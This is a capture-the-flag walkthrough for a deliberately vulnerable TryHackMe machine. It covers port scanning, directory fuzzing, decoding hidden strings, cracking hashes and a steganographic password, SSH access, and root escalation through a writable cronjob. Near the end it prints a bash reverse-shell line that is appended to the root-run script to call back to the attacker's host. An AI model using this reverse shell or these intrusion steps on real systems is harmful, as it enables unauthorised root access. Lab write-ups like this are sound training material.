```bash
# PLATFORM          . THM
# CTF NAME          . Easy Peasy
# DESCRIPTION       . Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/easypeasyctf
```

```
sudo nmap -sSVC -T5 -p- 10.10.82.34 -oN easy
```

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
|_http-title: Welcome to nginx!
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1

6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 304a2b22acd95609f2da122057f46cd4 (RSA)
|   256 bf86c9c7b7ef8c8bb994ae0188c0854d (ECDSA)
|_  256 a172ef6c812913ef5a6c24034cfe3d0b (ED25519)

65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.43 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- The first 3 questions on the CTF can be answered from this output alone. NGINX version is `1.16.1`, there are `3` open ports and `apache` is running on the higher port.

- `robots.txt` on port 80 doesn't reveal anything useful in particular

```
ffuf -u http://10.10.82.34/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

```
h{redacted}n                  [Status: 301, Size: 169, Words: 5, Lines: 8]
```

- Fuzzing the webserver we can find the `/hidden` directory.

- However, this doesn't help us much. Let's fuzz it one more time.

```
ffuf -u http://10.10.82.34/{redacted}/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

```
w{redacted}r                [Status: 301, Size: 169, Words: 5, Lines: 8]
```

- Here, in `/w{redacted}r`, if we inspect the source code of the page, we can find a base64 encoded text: `Zm{redacted}Q==`. 

- The decoded output of this message is the first flag.

- For the next flag, we need to head to `/robots.txt` on port `65524`. 

- I tried fuzzing this one too but I couldn't find anything.

```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18{redacted}250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

- We could use burp to change the user agent to be able to see the webpage, but I didn't think it's worth for now. I used `curl` instead.

```
curl http://10.10.82.34:65524 -A a186{redacted}3b250
```

- If we look carefully in the output, we can find the following:

```
<p hidden>its encoded with ba....:ObsJmP1{redacted}0Vu</p>
```

```
Fl4g 3 : flag{9fdafbd6{redacted}4cd312}
```

- Alright. The base used to encode the first message is `base62`. I used [this](https://www.dcode.fr/cipher-identifier) website to identify the encoding used. 

- After decoding the message ([here](https://www.dcode.fr/base62-encoding)), we get the next directory, `/n0t{redacted}3r`.

- In the source code we find `940d71e8655ac{redacted}7d1483e7f5fe6fd81`

- This is a `sha256` and the CTF gives us a file, `easypeasy.txt`. Let's use this wordlist to crack the hash.

- For some reason, John wasn't able to crack this using `easypeasy.txt` and I was sure I'm not doing something wrong syntax-wise. 

- I started revising my steps up until this point, thinking that maybe I've missed something. And I did, kinda.

- Along with the hash in the `/n0th{redacted}t3r` directory there was a local image this time (the others were sourced to the site using their URL)

- I used `wget` to download the `binarycodepixabay.jpg`. `binwalk` did not reveal anything and the output of `strings` made me skeptical, so I ran `steghide --extract -sf` and I got `steghide: could not extract any data with that passphrase!`

- My next move was `stegcrack`.

```
stegcracker binarycodepixabay.jpg easypeasy.txt 
```

- The password to extract the content from the file is `myp[redacted]ob` and the content of the file is

```
username:boring
password: 0110{redacted}1
```

- Let's SSH to the box.

- User flag is in `/home/boring/user.txt` but

```
boring@kral4-PC:~$ cat user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0j{REDACTED}4y}
```

- P.S: ROT13 was used to rotate this. 

- Privilege escalation is rather simple.

```
cat /etc/crontab 

* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

```
cat .mysecretcronjob.sh 

#!/bin/bash
# i will run as root
```

```
ls -l /var/www

-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
```

- As you can see, the `.mysecretcronjob.sh` is called as `root` via `crontab`. However, the bash script is owned by us, and thus, can be modified to whatever we like.

```
echo "sh -i >& /dev/tcp/10.11.53.46/3132 0>&1" >> .mysecretcronjob.sh
```

- This will append a simple bash reverse shell to the script.

- Shortly after, our listener will receive a connection as root.

- The root flag is in `/root/.root.txt

- Now, we're mising the `flag-2`... which.. damn :) I realised that the user agent found in `/robots.txt` on `port 65524` is not just a random value, it's actually a `MD5 hash`. 

- Crack it to get the flag :) [This](https://md5hashing.net/) should do the job.

